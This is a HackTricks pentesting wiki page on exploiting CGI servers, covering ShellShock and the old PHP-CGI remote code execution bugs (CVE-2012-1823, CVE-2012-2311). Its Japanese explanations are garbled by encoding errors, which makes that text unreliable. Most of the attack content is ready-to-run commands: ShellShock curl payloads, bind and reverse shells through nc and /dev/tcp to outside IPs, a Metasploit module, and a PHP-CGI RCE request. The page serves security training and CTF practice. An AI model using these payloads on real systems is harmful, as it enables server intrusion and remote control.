{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# æƒ…å ±

**CGIã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯perlã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã™**ã€‚ã—ãŸãŒã£ã¦ã€_**.cgi**_ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã§ãã‚‹ã‚µãƒ¼ãƒãƒ¼ã‚’ä¾µå®³ã—ãŸå ´åˆã€**perlãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«** \(`/usr/share/webshells/perl/perl-reverse-shell.pl`\) ã‚’**ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**ã—ã€**æ‹¡å¼µå­**ã‚’**.pl**ã‹ã‚‰**.cgi**ã«å¤‰æ›´ã—ã€**å®Ÿè¡Œæ¨©é™**ã‚’ä¸ãˆ \(`chmod +x`\)ã€**ã‚¦ã‚§ãƒ–ãƒ–ãƒ©ã‚¦ã‚¶ã‹ã‚‰**ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã«**ã‚¢ã‚¯ã‚»ã‚¹**ã—ã¦å®Ÿè¡Œã§ãã¾ã™ã€‚
**CGIè„†å¼±æ€§**ã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹ã«ã¯ã€`nikto -C all` \(ãŠã‚ˆã³ã™ã¹ã¦ã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³\)ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚’ãŠå‹§ã‚ã—ã¾ã™ã€‚

# **ShellShock**

**ShellShock**ã¯ã€Unixãƒ™ãƒ¼ã‚¹ã®ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã§åºƒãä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹**Bash**ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ã‚·ã‚§ãƒ«ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹**è„†å¼±æ€§**ã§ã™ã€‚ã“ã‚Œã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã‚ˆã£ã¦æ¸¡ã•ã‚ŒãŸã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹Bashã®èƒ½åŠ›ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã—ã¦ã„ã¾ã™ã€‚ã“ã®è„†å¼±æ€§ã¯ã€**ç’°å¢ƒå¤‰æ•°**ã®æ“ä½œã«ã‚ã‚Šã¾ã™ã€‚ç’°å¢ƒå¤‰æ•°ã¯ã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ä¸Šã§ãƒ—ãƒ­ã‚»ã‚¹ãŒã©ã®ã‚ˆã†ã«å®Ÿè¡Œã•ã‚Œã‚‹ã‹ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹å‹•çš„ãªåå‰ä»˜ãå€¤ã§ã™ã€‚æ”»æ’ƒè€…ã¯ã€ç’°å¢ƒå¤‰æ•°ã«**æ‚ªæ„ã®ã‚ã‚‹ã‚³ãƒ¼ãƒ‰**ã‚’æ·»ä»˜ã™ã‚‹ã“ã¨ã§ã“ã‚Œã‚’æ‚ªç”¨ã—ã€å¤‰æ•°ã‚’å—ã‘å–ã‚‹ã¨å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ã¯ã‚·ã‚¹ãƒ†ãƒ ã‚’ä¾µå®³ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã¨ã€**ãƒšãƒ¼ã‚¸ãŒã‚¨ãƒ©ãƒ¼ã‚’è¿”ã™**å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã®è„†å¼±æ€§ã‚’**è¦‹ã¤ã‘ã‚‹**ã«ã¯ã€**å¤ã„Apacheãƒãƒ¼ã‚¸ãƒ§ãƒ³**ã¨**cgi\_mod** \(cgiãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã‚’å«ã‚€\)ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã“ã¨ã«æ°—ã¥ãã‹ã€**nikto**ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

## **ãƒ†ã‚¹ãƒˆ**

ã»ã¨ã‚“ã©ã®ãƒ†ã‚¹ãƒˆã¯ã€ä½•ã‹ã‚’ã‚¨ã‚³ãƒ¼ã—ã€ãã®æ–‡å­—åˆ—ãŒã‚¦ã‚§ãƒ–ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«è¿”ã•ã‚Œã‚‹ã“ã¨ã‚’æœŸå¾…ã™ã‚‹ã“ã¨ã«åŸºã¥ã„ã¦ã„ã¾ã™ã€‚ãƒšãƒ¼ã‚¸ãŒè„†å¼±ã§ã‚ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ã¨æ€ã‚ã‚Œã‚‹å ´åˆã¯ã€ã™ã¹ã¦ã®cgiãƒšãƒ¼ã‚¸ã‚’æ¤œç´¢ã—ã¦ãƒ†ã‚¹ãƒˆã—ã¦ãã ã•ã„ã€‚

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curl \(ãƒªãƒ•ãƒ¬ã‚¯ãƒ†ã‚£ãƒƒãƒ‰ã€ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰ã€ã‚¢ã‚¦ãƒˆã‚ªãƒ–ãƒãƒ³ãƒ‰\)**
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
## ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
# **ãƒ—ãƒ­ã‚­ã‚· \(MitMã‹ã‚‰Webã‚µãƒ¼ãƒãƒ¼ãƒªã‚¯ã‚¨ã‚¹ãƒˆã¸\)**

CGIã¯ã€httpãƒªã‚¯ã‚¨ã‚¹ãƒˆã®å„ãƒ˜ãƒƒãƒ€ãƒ¼ã«å¯¾ã—ã¦ç’°å¢ƒå¤‰æ•°ã‚’ä½œæˆã—ã¾ã™ã€‚ä¾‹ãˆã°ï¼šã€Œhost:web.comã€ã¯ã€ŒHTTP\_HOST"="web.comã€ã¨ã—ã¦ä½œæˆã•ã‚Œã¾ã™ã€‚

HTTP\_PROXYå¤‰æ•°ã¯Webã‚µãƒ¼ãƒãƒ¼ã«ã‚ˆã£ã¦ä½¿ç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚**ãƒ˜ãƒƒãƒ€ãƒ¼**ã«ã€Œ**Proxy: &lt;IP\_attacker&gt;:&lt;PORT&gt;**ã€ã‚’å«ã‚ã¦é€ä¿¡ã—ã¦ã¿ã¦ãã ã•ã„ã€‚ãã—ã¦ã€ã‚µãƒ¼ãƒãƒ¼ãŒã‚»ãƒƒã‚·ãƒ§ãƒ³ä¸­ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å®Ÿè¡Œã™ã‚‹å ´åˆã€ã‚µãƒ¼ãƒãƒ¼ãŒè¡Œã£ãŸå„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

# å¤ã„PHP + CGI = RCE \(CVE-2012-1823, CVE-2012-2311\)

åŸºæœ¬çš„ã«ã€cgiãŒã‚¢ã‚¯ãƒ†ã‚£ãƒ–ã§ã€phpãŒã€Œå¤ã„ã€\(&lt;5.3.12 / &lt; 5.4.2\)å ´åˆã€ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚
ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã«ã¯ã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’é€ä¿¡ã›ãšã«\(ç‰¹ã«ã€Œ=ã€æ–‡å­—ã‚’é€ä¿¡ã›ãšã«\)Webã‚µãƒ¼ãƒãƒ¼ã®PHPãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
æ¬¡ã«ã€ã“ã®è„†å¼±æ€§ã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹ãŸã‚ã«ã€ä¾‹ãˆã°`/index.php?-s`ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨\( `-s`ã«æ³¨æ„\)ã€**ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ãŒãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«è¡¨ç¤ºã•ã‚Œã¾ã™**ã€‚

æ¬¡ã«ã€**RCE**ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã€ã“ã®ç‰¹åˆ¥ãªã‚¯ã‚¨ãƒªã‚’é€ä¿¡ã§ãã¾ã™ï¼š`/?-d allow_url_include=1 -d auto_prepend_file=php://input`ã¨**ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ãƒœãƒ‡ã‚£å†…ã§å®Ÿè¡Œã•ã‚Œã‚‹PHPã‚³ãƒ¼ãƒ‰**ã€‚
ä¾‹ï¼š**
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**è„†å¼±æ€§ã¨å¯èƒ½ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±:** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**CTFã®è§£èª¬ä¾‹**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**.**



{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„!
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
